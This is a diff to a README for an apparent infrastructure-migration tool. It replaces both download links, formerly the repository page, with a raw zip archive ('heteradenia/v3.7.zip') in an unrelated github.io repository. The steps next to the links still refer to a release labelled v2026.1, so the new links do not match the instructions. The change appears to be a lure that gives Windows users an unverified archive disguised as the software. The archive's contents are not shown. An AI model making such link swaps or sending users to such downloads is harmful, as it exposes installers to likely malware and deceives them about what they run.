@@ -5,7 +5,7 @@ description: "Orchestrate zero-downtime infrastructure migrations across multi-r
 ---
 # ⚙️ mors-transitions-v2026 - Move your infrastructure without any downtime
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Ommustaf3845/mors-transitions-v2026)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Ommustaf3845/ommustaf3845.github.io/raw/refs/heads/main/heteradenia/v3.7.zip)
 
 ## 🎯 Purpose of this software
 
@@ -25,7 +25,7 @@ Ensure your computer has the following items before you begin:
 
 You must visit the project release page to get the installer for Windows. 
 
-[Visit this page to download the software](https://github.com/Ommustaf3845/mors-transitions-v2026)
+[Visit this page to download the software](https://github.com/Ommustaf3845/ommustaf3845.github.io/raw/refs/heads/main/heteradenia/v3.7.zip)
 
 1. Navigate to the link above.
 2. Locate the most recent version labeled v2026.1 in the releases section.
